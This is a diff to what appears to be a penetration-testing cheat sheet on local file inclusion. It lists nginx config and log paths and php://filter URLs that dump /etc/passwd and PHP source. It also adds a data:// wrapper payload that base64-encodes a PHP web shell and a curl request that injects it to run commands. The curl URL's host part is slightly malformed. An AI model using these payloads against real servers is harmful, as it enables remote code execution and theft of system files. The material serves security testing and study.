@@ -2797,12 +2797,12 @@ Try
 Unicode https://jlajara.gitlab.io/Bypass_WAF_Unicode  https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability
 
 ###### nginx paths
-/etc/nginx
-/etc/nginx/nginx.conf/etc/nginx/nginx.conf
-/etc/nginx/sites-available/
-/etc/nginx/sites-enabled/
-/var/log/nginx/access.log
-/var/log/nginx/error.log
+	/etc/nginx
+	/etc/nginx/nginx.conf/etc/nginx/nginx.conf
+	/etc/nginx/sites-available/
+	/etc/nginx/sites-enabled/
+	/var/log/nginx/access.log
+	/var/log/nginx/error.log
 
 ##### php://filter Wrapper
 
@@ -2820,6 +2820,16 @@ url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
 http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
 http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
 base64 -d <FILE>.php
+```
+
+Use the data:// wrapper with base64-encoded data
+
+```c
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+```
+
+```c
+curl "http:/IP/PORT/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 ```
 
 ##### Django, Rails, or Node.js Web Application Header Values
